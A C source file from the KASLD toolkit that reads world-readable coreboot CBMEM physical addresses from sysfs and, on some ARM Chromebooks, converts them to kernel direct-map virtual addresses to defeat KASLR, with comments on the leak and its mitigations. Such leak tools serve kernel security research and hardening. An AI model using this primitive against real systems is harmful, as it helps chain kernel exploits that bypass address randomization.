// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Read physical memory addresses of coreboot memory (CBMEM) entries from
// the coreboot sysfs bus.
//
// The coreboot firmware populates a table of memory entries (CBMEM) in
// physical DRAM at boot. The Linux kernel driver enumerates these entries
// and exposes each one's physical base address via sysfs:
//
//   /sys/bus/coreboot/devices/cbmem-<id>/address  (physical base, 0x%llx)
//   /sys/bus/coreboot/devices/cbmem-<id>/size      (region size)
//
// The 'address' attribute is created with DEVICE_ATTR_RO (S_IRUGO, 0444)
// in drivers/firmware/google/cbmem.c — no capability check,
// world-readable. The value is cbmem_entry.address (uint64_t physical
// address of the CBMEM region in DRAM).
//
// CBMEM regions include firmware log, ACPI tables, timestamps, and other
// platform data. All are placed in physical DRAM by coreboot.
//
// On ARM Chromebooks without CONFIG_RANDOMIZE_BASE, the physical address
// directly yields a linear-map kernel virtual address:
//   arm32/arm64: va = phys + PAGE_OFFSET - PHYS_OFFSET
//
// Leak primitive:
//   Data leaked:      physical DRAM address of coreboot CBMEM entries
//   Kernel subsystem: drivers/firmware/google — /sys/bus/coreboot/devices/
//   Data structure:   struct lb_cbmem_entry → address (uint64_t)
//   Address type:     physical (DRAM)
//   Method:           parsed (sysfs text attribute)
//   Status:           unfixed (information exposure by design)
//   Access check:     none (world-readable via DEVICE_ATTR_RO / S_IRUGO)
//   Source:
//   https://elixir.bootlin.com/linux/latest/source/drivers/firmware/google/cbmem.c
//
// Mitigations:
//   CONFIG_GOOGLE_CBMEM=n removes the sysfs entries. On x86_64 with
//   CONFIG_RANDOMIZE_MEMORY enabled, physical addresses do not directly
//   reveal the virtual text base.
//
// Requires:
// - CONFIG_GOOGLE_CBMEM (selected on coreboot/Chromebook systems)
// - coreboot firmware with CBMEM entries
//
// References:
// https://elixir.bootlin.com/linux/latest/source/drivers/firmware/google/cbmem.c
// https://www.coreboot.org/CBMEM
// ---
// <bcoles@gmail.com>

#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

KASLD_EXPLAIN(
    "Reads physical DRAM addresses of coreboot CBMEM entries from "
    "/sys/bus/coreboot/devices/cbmem-*/address. The coreboot CBMEM driver "
    "exposes each entry's physical base address with world-readable (0444) "
    "DEVICE_ATTR_RO attributes — no capability check, not gated by "
    "kptr_restrict. On ARM Chromebook systems with a fixed physical-to-"
    "virtual mapping, these DRAM addresses yield linear-map kernel virtual "
    "addresses. Requires CONFIG_GOOGLE_CBMEM.");

// Untested: no coreboot/Chromebook hardware available for testing.
KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:physical\n"
           "config:CONFIG_GOOGLE_CBMEM\n");

int main(void) {
  const char *base = "/sys/bus/coreboot/devices";
  DIR *d;
  struct dirent *ent;
  char path[512];
  char buf[256];
  char label[128];
  int count = 0;

  kasld_info("searching %s for CBMEM physical memory addresses ...", base);

  d = kasld_opendir(base);
  if (!d) {
    if (errno == EACCES || errno == EPERM)
      return KASLD_EXIT_NOPERM;
    /* /sys/bus/coreboot absent if CONFIG_GOOGLE_COREBOOT_TABLE is not enabled
     */
    return KASLD_EXIT_UNAVAILABLE;
  }

  while ((ent = readdir(d)) != NULL) {
    /* CBMEM entries are named cbmem-XXXXXXXX (8-digit hex tag) */
    if (strncmp(ent->d_name, "cbmem-", 6) != 0)
      continue;

    snprintf(path, sizeof(path), "%s/%s/address", base, ent->d_name);

    if (kasld_read_file_line(path, buf, sizeof(buf)) < 0)
      continue;

    unsigned long long addr = 0;
    if (sscanf(buf, "0x%llx", &addr) != 1)
      continue;

    if (!addr)
      continue;

    /* CBMEM (CoreBoot's bookkeeping table) is firmware-reserved memory.
     * The CBMEM entry directory name (e.g. "cb_acpi") identifies which
     * coreboot subsystem allocated it. */
    snprintf(label, sizeof(label), "%.32s", ent->d_name);

    /* The sibling size attribute gives the region extent: emit the whole
     * reserved band so the engine can exclude it (phys_reservation_exclude),
     * not just a single interior point. Parse it strictly as hex; if the
     * attribute is absent, unparseable, zero, or the extent is not
     * representable in the word, fall back to a base-only sample (a
     * wrong-format size can never widen the band). */
    unsigned long long size = 0;
    snprintf(path, sizeof(path), "%s/%s/size", base, ent->d_name);
    if (kasld_read_file_line(path, buf, sizeof(buf)) == 0)
      (void)sscanf(buf, "0x%llx", &size);
    unsigned long long end = addr + size - 1; /* inclusive last byte */

    if (size && end > addr && (unsigned long)end == end) {
      kasld_found("sysfs_cbmem %s: phys = 0x%016llx - 0x%016llx", label, addr,
                  end);
      kasld_result_range(KASLD_TYPE_PHYS, REGION_RESERVED_MEM,
                         (unsigned long)addr, (unsigned long)end, label,
                         CONF_PARSED);
    } else {
      kasld_found("sysfs_cbmem %s: phys = 0x%016llx", label, addr);
      kasld_result_sample(KASLD_TYPE_PHYS, REGION_RESERVED_MEM,
                          (unsigned long)addr, label, CONF_PARSED);
    }
    count++;

#ifdef phys_to_directmap_virt
    unsigned long virt = phys_to_directmap_virt((unsigned long)addr);
    kasld_found("sysfs_cbmem %s: directmap va = 0x%016lx", label, virt);
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_DIRECTMAP, virt, label,
                        CONF_PARSED);
#endif
  }
  closedir(d);

  if (!count) {
    kasld_err("no CBMEM entries with non-zero addresses found in %s", base);
    return KASLD_EXIT_UNAVAILABLE;
  }

  return 0;
}
